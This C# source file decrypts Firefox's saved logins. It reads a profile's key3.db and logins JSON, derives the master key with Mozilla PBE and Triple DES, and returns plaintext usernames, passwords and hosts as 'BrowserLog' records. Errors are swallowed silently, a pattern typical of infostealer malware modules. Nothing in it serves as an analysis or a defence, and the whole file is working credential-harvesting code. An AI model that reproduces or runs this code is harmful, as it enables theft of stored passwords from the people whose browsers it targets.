using System;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;
using System.Xml;
using System.Xml.Serialization;

namespace ConsoleApplication19
{
    public static class Helpers
    {
        private static JavaScriptSerializer json;

        private static JavaScriptSerializer JSON
        {
            get
            {
                return Helpers.json ?? (Helpers.json = new JavaScriptSerializer());
            }
        }

        private static Stream ToStream(this string @this)
        {
            MemoryStream memoryStream = new MemoryStream();
            StreamWriter streamWriter = new StreamWriter((Stream)memoryStream);
            string str = @this;
            streamWriter.Write(str);
            streamWriter.Flush();
            long num = 0;
            memoryStream.Position = num;
            return (Stream)memoryStream;
        }

        public static T ParseXML<T>(this string @this) where T : class
        {
            return new XmlSerializer(typeof(T)).Deserialize(XmlReader.Create(@this.Trim().ToStream(), new XmlReaderSettings()
            {
                ConformanceLevel = ConformanceLevel.Document
            })) as T;
        }

        public static T ParseJSON<T>(this string @this) where T : class
        {
            return Helpers.JSON.Deserialize<T>(@this.Trim());
        }
    }
    public class Login
    {
        public int id { get; set; }

        public string hostname { get; set; }

        public object httpRealm { get; set; }

        public string formSubmitURL { get; set; }

        public string usernameField { get; set; }

        public string passwordField { get; set; }

        public string encryptedUsername { get; set; }

        public string encryptedPassword { get; set; }

        public string guid { get; set; }

        public int encType { get; set; }

        public long timeCreated { get; set; }

        public long timeLastUsed { get; set; }

        public long timePasswordChanged { get; set; }

        public int timesUsed { get; set; }
    }
    public class RootObject
    {
        public int nextId { get; set; }

        public Login[] logins { get; set; }

        public object[] disabledHosts { get; set; }

        public int version { get; set; }
    }

    public class TripleDESHelper
    {
        public static string DESCBCDecryptor(byte[] key, byte[] iv, byte[] input)
        {
            using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                cryptoServiceProvider.Key = key;
                cryptoServiceProvider.IV = iv;
                cryptoServiceProvider.Mode = CipherMode.CBC;
                cryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV);
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
                            return streamReader.ReadToEnd();
                    }
                }
            }
        }

        public static byte[] DESCBCDecryptorByte(byte[] key, byte[] iv, byte[] input)
        {
            byte[] buffer = new byte[512];
            using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
            {
                cryptoServiceProvider.Key = key;
                cryptoServiceProvider.IV = iv;
                cryptoServiceProvider.Mode = CipherMode.CBC;
                cryptoServiceProvider.Padding = PaddingMode.None;
                ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(cryptoServiceProvider.Key, cryptoServiceProvider.IV);
                using (MemoryStream memoryStream = new MemoryStream(input))
                {
                    using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
                        cryptoStream.Read(buffer, 0, buffer.Length);
                }
            }
            return buffer;
        }
    }

    public static class ByteHelper
    {
        public static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
                throw new ArgumentException(string.Format((IFormatProvider)CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[1]
                {
          (object) hexString
                }));
            byte[] numArray = new byte[hexString.Length / 2];
            for (int index = 0; index < numArray.Length; ++index)
            {
                string s = hexString.Substring(index * 2, 2);
                numArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider)CultureInfo.InvariantCulture);
            }
            return numArray;
        }
    }

    public class PasswordCheck
    {
        public string EntrySalt { get; private set; }

        public string OID { get; private set; }

        public string Passwordcheck { get; private set; }

        public PasswordCheck(string DataToParse)
        {
            int length1 = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
            this.EntrySalt = DataToParse.Substring(6, length1);
            int length2 = DataToParse.Length - (6 + length1 + 36);
            this.OID = DataToParse.Substring(6 + length1 + 36, length2);
            this.Passwordcheck = DataToParse.Substring(6 + length1 + 4 + length2);
        }
    }

    public class BrowserLog
    {
        public string Login { get; set; }

        public string Password { get; set; }

        public string Host { get; set; }
    }

    internal interface IPasswordDecrypter
    {
        List<BrowserLog> GetPasswords();
    }

    class FireFox : IPasswordDecrypter
    {
        private string Profile;
        private string Key3Db;
        private string LoginJson;

        public FireFox(string profilePath)
        {
            if (!Directory.Exists(profilePath))
                throw new ArgumentException(string.Format("Folder \"{0}\" not exists", (object)profilePath));
            this.Profile = profilePath;
            if (!File.Exists(Path.Combine(profilePath, "key3.db")))
                throw new ArgumentException("key3.db not exists in this folder");
            this.Key3Db = Path.Combine(profilePath, "key3.db");
            if (!File.Exists(Path.Combine(profilePath, "logins2.json")))
                throw new ArgumentException("key3.db not exists in this folder");
            this.LoginJson = Path.Combine(profilePath, "logins2.json");
        }

        public List<BrowserLog> GetPasswords()
        {
            try
            {
                List<BrowserLog> browserLogList = new List<BrowserLog>();
                DataTable dataTable = new DataTable();
                Asn1Der asn1Der = new Asn1Der();
                BerkeleyDB berkeleyDb = new BerkeleyDB(this.Key3Db);
                PasswordCheck passwordCheck = new PasswordCheck(berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>)(p => p.Key.Equals("password-check"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>)(p => p.Value)).FirstOrDefault<string>().Replace("-", string.Empty));
                string hexString1 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>)(p => p.Key.Equals("global-salt"))).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>)(p => p.Value)).FirstOrDefault<string>().Replace("-", string.Empty);
                MozillaPBE mozillaPbe1 = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString1), Encoding.ASCII.GetBytes(string.Empty), ByteHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
                mozillaPbe1.Compute();
                TripleDESHelper.DESCBCDecryptor(mozillaPbe1.Key, mozillaPbe1.IV, ByteHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
                string hexString2 = berkeleyDb.Keys.Where<KeyValuePair<string, string>>((Func<KeyValuePair<string, string>, bool>)(p =>
                {
                    if (!p.Key.Equals("global-salt") && !p.Key.Equals("Version"))
                        return !p.Key.Equals("password-check");
                    return false;
                })).Select<KeyValuePair<string, string>, string>((Func<KeyValuePair<string, string>, string>)(p => p.Value)).FirstOrDefault<string>().Replace("-", "");
                Asn1DerObject asn1DerObject1 = asn1Der.Parse(ByteHelper.ConvertHexStringToByteArray(hexString2));
                MozillaPBE mozillaPbe2 = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString1), Encoding.ASCII.GetBytes(string.Empty), asn1DerObject1.objects[0].objects[0].objects[1].objects[0].Data);
                mozillaPbe2.Compute();
                byte[] dataToParse = TripleDESHelper.DESCBCDecryptorByte(mozillaPbe2.Key, mozillaPbe2.IV, asn1DerObject1.objects[0].objects[1].Data);
                Asn1DerObject asn1DerObject2 = asn1Der.Parse(dataToParse);
                Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.objects[0].objects[2].Data);
                byte[] key = new byte[24];
                if (asn1DerObject3.objects[0].objects[3].Data.Length > 24)
                    Array.Copy((Array)asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.Length - 24, (Array)key, 0, 24);
                else
                    key = asn1DerObject3.objects[0].objects[3].Data;
                foreach (Login login in File.ReadAllText(this.LoginJson).ParseJSON<RootObject>().logins)
                {
                    Asn1DerObject asn1DerObject4 = asn1Der.Parse(Convert.FromBase64String(login.encryptedUsername));
                    Asn1DerObject asn1DerObject5 = asn1Der.Parse(Convert.FromBase64String(login.encryptedPassword));
                    string str1 = Regex.Replace(TripleDESHelper.DESCBCDecryptor(key, asn1DerObject4.objects[0].objects[1].objects[1].Data, asn1DerObject4.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", string.Empty);
                    string str2 = Regex.Replace(TripleDESHelper.DESCBCDecryptor(key, asn1DerObject5.objects[0].objects[1].objects[1].Data, asn1DerObject5.objects[0].objects[2].Data), "[^\\u0020-\\u007F]", string.Empty);
                    BrowserLog browserLog = new BrowserLog()
                    {
                        Host = string.IsNullOrWhiteSpace(login.hostname) ? "UNKOWN" : login.hostname,
                        Login = string.IsNullOrWhiteSpace(str1) ? "UNKOWN" : str1,
                        Password = string.IsNullOrWhiteSpace(str2) ? "UNKOWN" : str2
                    };
                    if (browserLog.Login != "UNKOWN" && browserLog.Password != "UNKOWN" && browserLog.Host != "UNKOWN")
                        browserLogList.Add(browserLog);
                }
                return browserLogList;
            }
            catch
            {
                return new List<BrowserLog>();
            }
        }
    }
}